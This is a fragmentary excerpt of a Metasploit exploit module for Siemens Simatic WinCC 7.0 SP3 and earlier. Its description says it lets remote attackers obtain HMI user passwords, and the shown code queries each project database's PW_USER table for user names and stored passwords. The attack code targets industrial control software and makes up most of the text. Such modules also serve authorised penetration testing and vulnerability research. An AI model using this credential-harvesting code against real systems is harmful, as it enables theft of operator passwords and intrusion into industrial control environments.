...
class Metasploit3 < Msf::Exploit::Remote
	...
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Simatic WinCC <= 7.0 SP3 Update2 information gathering',
			'Description'    => %q{
					This module allows remote attackers to get HMI users passwords on
	...
	def get_info dbs
		...
		dbs.map do |db|
			...
			prj[db]["users"] = q("SELECT 	ID, 
											NAME, 
											convert(varbinary, PASS), 
											GRPID 
								FROM #{db}.[dbo].[PW_USER] 
								WHERE PASS <> '' and GRPID <> 1000")
